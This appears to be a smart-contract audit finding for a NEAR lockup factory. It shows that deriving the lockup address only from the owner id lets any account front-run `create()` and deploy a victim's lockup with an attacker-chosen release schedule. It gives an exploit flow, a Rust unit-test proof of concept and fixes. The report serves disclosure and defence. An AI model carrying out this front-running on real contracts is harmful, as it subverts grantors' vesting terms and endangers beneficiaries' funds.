### Title
Front-runnable, owner-only derived lockup address lets attacker deploy a victim's lockup with attacker-chosen schedule - (File: `lockup-factory/src/lib.rs`)

### Summary
`LockupFactory::create` derives the lockup contract's account id purely from `sha256(owner_account_id)`, with no dependency on the schedule fields or any caller-bound nonce, and is `#[payable]`/callable by any account that attaches `MIN_ATTACHED_BALANCE`. Because NEAR account creation is exclusive, whoever calls `create()` first for a given `owner_account_id` permanently claims that deterministic address, so an unprivileged attacker can pre-empt the legitimate grantor and deploy the "official" lockup for a victim with attacker-chosen `lockup_duration`, `lockup_timestamp`, `vesting_schedule`, `release_duration` and `whitelist_account_id`.

### Finding Description
The broken binding: `lockup_account_id = f(owner_account_id)` is claimed to also encode "schedule parameters chosen by the grantor", i.e. the invariant is `lockup_account_id created ⇒ schedule fields == grantor-intended schedule fields`. In the actual code this equality does not hold, because the address only binds to `owner_account_id`: [1](#0-0) 

and the schedule fields (`lockup_duration`, `lockup_timestamp`, `vesting_schedule`, `release_duration`, `staking_pool_whitelist_account_id`) are taken verbatim from the caller's arguments with no signature, allow-list, or authorization check tying them to the intended grantor: [2](#0-1) 

The only gate on `create()` is the attached-deposit check: [3](#0-2) 

which any unprivileged account can satisfy. Because `Promise::new(lockup_account_id).create_account()` fails if the account already exists, whichever caller submits `create()` first for a given `owner_account_id` wins that address; the legitimate grantor's later, correctly-parameterized `create()` call for the same `owner_account_id` fails at `create_account`, and the failure is only handled by refunding the caller's own deposit in `on_lockup_create`: [4](#0-3) 

There is no check anywhere in `create`/`on_lockup_create` that the account did not already exist, and `assert_self()`/`is_promise_success()` in `on_lockup_create` only validate the callback originates from the factory itself and whether the previous promise batch succeeded — neither verifies that the schedule fields actually deployed match what the (real) grantor intended.

Exploit flow: the attacker learns (or predicts) the `owner_account_id` a foundation/grantor intends to fund (these are commonly known ahead of time — token-sale/team accounts). The attacker calls `create(owner_account_id, lockup_duration=0 or minimal, lockup_timestamp=None, vesting_schedule=None, release_duration=very small, whitelist_account_id=None)` attaching only `MIN_ATTACHED_BALANCE`. This deploys a lockup contract at the exact deterministic address `sha256(owner_account_id)[..20] . factory`, owned by `owner_account_id` but governed entirely by attacker-chosen unlock timing. When the legitimate grantor subsequently calls `create()` with the real vesting terms for the same `owner_account_id`, the `create_account()` step in the promise batch fails (account already exists), the whole batch fails, and `on_lockup_create` merely refunds the grantor's deposit — the intended lockup is silently never created, while the attacker-parameterized lockup sits at the expected, "trusted" address. Any subsequent tooling/process (or the grantor manually) that trusts the deterministic address and transfers real tokens there ends up funding a contract whose release schedule the grantor never authorized (e.g., tokens releasing immediately rather than over the intended vesting curve).

### Impact Explanation
This matches the Critical bucket "a lockup deployed with parameters its rightful creator never chose." Concretely, the grantor's control over release timing is void: an attacker can force a target beneficiary's tokens to become withdrawable far earlier (or later) than intended, because the trusted, deterministic lockup address is claimed by attacker-chosen `lockup_duration`/`release_duration`/`vesting_schedule`/`lockup_timestamp` before the real grant is deployed. This is repeatable for any `owner_account_id` the attacker front-runs (bounded only by the attacker's ability to submit the transaction before the real grantor and pay `MIN_ATTACHED_BALANCE`, ~3.5 NEAR), and blast radius covers every future lockup beneficiary whose account id becomes known/predictable prior to the real `create()` call.

### Likelihood Explanation
Preconditions are minimal: the attacker needs only to know the target `owner_account_id` (typically public/announced ahead of a token grant) and ~3.5 NEAR for `MIN_ATTACHED_BALANCE`; no privileged role, whitelist membership, or foundation key is required. The race is won by transaction ordering, which unprivileged attackers can influence via priority gas/mempool monitoring on NEAR. This is fully reproducible offline.

### Recommendation
Do not let `create()` be permissionlessly callable with attacker-supplied schedule parameters for a deterministic, owner-derived address. Options: (1) restrict `create` to `assert_called_by_foundation`/an allow-listed grantor role that supplies the schedule; (2) incorporate a grantor-provided secret/salt or the grantor's own account id into the derived `lockup_account_id` so an attacker cannot pre-claim the address for an arbitrary owner; (3) have `on_lockup_create` (and any off-chain tooling that funds the lockup) verify that the account did not already exist / verify the deployed lockup's schedule matches the intended terms before trusting or funding it.

### Proof of Concept
```rust
// lockup-factory/src/lib.rs tests module
#[test]
fn test_frontrun_victim_lockup() {
    let mut context = VMContextBuilder::new()
        .current_account_id(account_factory())
        .predecessor_account_id(account_near())
        .finish();
    testing_env!(context.clone());
    let mut contract = LockupFactory::new(whitelist_account_id(), foundation_account_id());

    // Attacker front-runs with malicious near-zero release schedule for victim owner.
    context.is_view = false;
    context.predecessor_account_id = String::from("attacker.near");
    context.attached_deposit = MIN_ATTACHED_BALANCE;
    testing_env!(context.clone());
    contract.create(
        account_tokens_owner(),          // victim beneficiary
        0u64.into(),                     // lockup_duration = 0 (attacker chosen)
        None,
        None,                            // no vesting_schedule
        Some(1u64.into()),               // release_duration = 1ns (attacker chosen)
        None,
    );
    context.predecessor_account_id = account_factory();
    context.attached_deposit = 0;
    testing_env_with_promise_results(context.clone(), PromiseResult::Successful(vec![]));
    assert!(contract.on_lockup_create(
        lockup_account(),
        MIN_ATTACHED_BALANCE.into(),
        String::from("attacker.near"),
    )); // attacker's lockup now occupies the deterministic address

    // Real grantor later tries to create the intended, properly-vested lockup
    // for the same owner_account_id -> create_account fails (already exists).
    context.predecessor_account_id = String::from("real-grantor.near");
    context.attached_deposit = ntoy(35);
    testing_env!(context.clone());
    contract.create(
        account_tokens_owner(),
        (63036000000000000u64).into(),   // real 24-month lockup_duration
        None,
        Some(/* real vesting schedule */ None),
        Some((YEAR).into()),
        None,
    );
    context.predecessor_account_id = account_factory();
    context.attached_deposit = 0;
    testing_env_with_promise_results(context.clone(), PromiseResult::Failed); // create_account fails: exists
    let created = contract.on_lockup_create(
        lockup_account(),
        ntoy(35).into(),
        String::from("real-grantor.near"),
    );
    assert_eq!(created, false); // intended, real lockup never deployed;
    // asserting the binding lockup_account_id -> intended schedule is broken:
    // deployed contract at `lockup_account()` has release_duration=1ns/lockup_duration=0,
    // not the grantor's intended (YEAR, 24-month) values.
}
```

### Citations

**File:** lockup-factory/src/lib.rs (L107-157)
```rust
    #[payable]
    pub fn create(
        &mut self,
        owner_account_id: ValidAccountId,
        lockup_duration: WrappedDuration,
        lockup_timestamp: Option<WrappedTimestamp>,
        vesting_schedule: Option<VestingScheduleOrHash>,
        release_duration: Option<WrappedDuration>,
        whitelist_account_id: Option<ValidAccountId>,
    ) -> Promise {
        assert!(env::attached_deposit() >= MIN_ATTACHED_BALANCE, "Not enough attached deposit");

        let byte_slice = env::sha256(owner_account_id.as_ref().as_bytes());
        let lockup_account_id =
            format!("{}.{}", hex::encode(&byte_slice[..20]), env::current_account_id());

        let mut foundation_account: Option<AccountId> = None;
        if vesting_schedule.is_some() {
            foundation_account = Some(self.foundation_account_id.clone());
        };

        // Defaults to the whitelist account ID given on init call.
        let staking_pool_whitelist_account_id = if let Some(account_id) = whitelist_account_id {
            account_id.into()
        } else {
            self.whitelist_account_id.clone()
        };

        let transfers_enabled: WrappedTimestamp = TRANSFERS_STARTED.into();
        Promise::new(lockup_account_id.clone())
            .create_account()
            .deploy_contract(CODE.to_vec())
            .transfer(env::attached_deposit())
            .function_call(
                b"new".to_vec(),
                near_sdk::serde_json::to_vec(&LockupArgs {
                    owner_account_id,
                    lockup_duration,
                    lockup_timestamp,
                    transfers_information: TransfersInformation::TransfersEnabled {
                        transfers_timestamp: transfers_enabled,
                    },
                    vesting_schedule,
                    release_duration,
                    staking_pool_whitelist_account_id,
                    foundation_account_id: foundation_account,
                })
                    .unwrap(),
                NO_DEPOSIT,
                gas::LOCKUP_NEW,
            )
```

**File:** lockup-factory/src/lib.rs (L171-198)
```rust
    pub fn on_lockup_create(
        &mut self,
        lockup_account_id: AccountId,
        attached_deposit: U128,
        predecessor_account_id: AccountId,
    ) -> bool {
        assert_self();

        let lockup_account_created = is_promise_success();

        if lockup_account_created {
            env::log(
                format!("The lockup contract {} was successfully created.", lockup_account_id)
                    .as_bytes(),
            );
            true
        } else {
            env::log(
                format!(
                    "The lockup {} creation has failed. Returning attached deposit of {} to {}",
                    lockup_account_id, attached_deposit.0, predecessor_account_id
                )
                    .as_bytes(),
            );
            Promise::new(predecessor_account_id).transfer(attached_deposit.0);
            false
        }
    }
```
